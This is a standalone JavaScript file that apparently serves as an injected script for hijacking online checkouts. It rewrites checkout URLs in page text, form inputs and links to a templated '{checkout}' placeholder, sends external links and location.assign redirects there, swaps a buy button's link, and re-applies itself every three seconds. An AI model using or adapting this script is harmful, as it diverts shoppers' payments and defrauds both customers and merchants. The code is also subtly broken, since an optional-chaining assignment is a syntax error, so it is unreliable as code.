function isExternalUrl(url) {
    const currentPageHost = window.location.host;
    const urlHost = new URL(url, window.location.href).host;
    return currentPageHost !== urlHost;
}

function findAndReplaceText(node, regex, replace) {
    function replaceText(textNode) {
        if (textNode.nodeType === Node.TEXT_NODE && regex.test(textNode.nodeValue)) {
            textNode.nodeValue = textNode.nodeValue.replace(regex, replace);
        }
    }
    function replaceInputValue(inputElement) {
        if (regex.test(inputElement.value)) {
            inputElement.value = inputElement.value.replace(regex, replace);
        }
    }
    function replaceHref(anchorElement) {
        if (regex.test(anchorElement.href)) {
            anchorElement.href = anchorElement.href.replace(regex, replace);
        }

        if (isExternalUrl(anchorElement.href)) {
            anchorElement.href = "{checkout}";
        }
    }

    function processNode(element) {
        Array.from(element.childNodes).forEach((child) => {
            if (child.nodeType === Node.TEXT_NODE) {
                replaceText(child);
            } else if (child.nodeType === Node.ELEMENT_NODE) {
                if (child.nodeName !== "STYLE") {
                    if (child.shadowRoot) {
                        processNode(child.shadowRoot);
                    } else {
                        processNode(child);
                    }
                }
                if (child.tagName === "INPUT" || child.tagName === "TEXTAREA") {
                    replaceInputValue(child);
                } else if (child.tagName === "A") {
                    replaceHref(child);
                }
            }
        });
    }

    processNode(node);
}

let interceptJavaScript = false;
function interceptJavaScriptRedirects() {
    if (interceptJavaScript) return;
    interceptJavaScript = true;

    const originalLocationAssign = window.location.assign;
    window.location.assign = function (url) {
        if (isExternalUrl(url)) {
            originalLocationAssign.call(this, "{checkout}");
        } else {
            originalLocationAssign.call(this, url);
        }
    };
}

function mainGo() {
    interceptJavaScriptRedirects();
    findAndReplaceText(
        document.body,
        /https?:\/\/[^\/\s]+(?:\/[^\/\s]*)*\/checkout\/[^\/\s]+(?=\s|\"|$)/g,
        "{checkout}"
    );
    document.querySelector("a.buy-button")?.href = "https://google.com";
}

mainGo();
window.addEventListener("load", mainGo);
setInterval(mainGo, 3000);
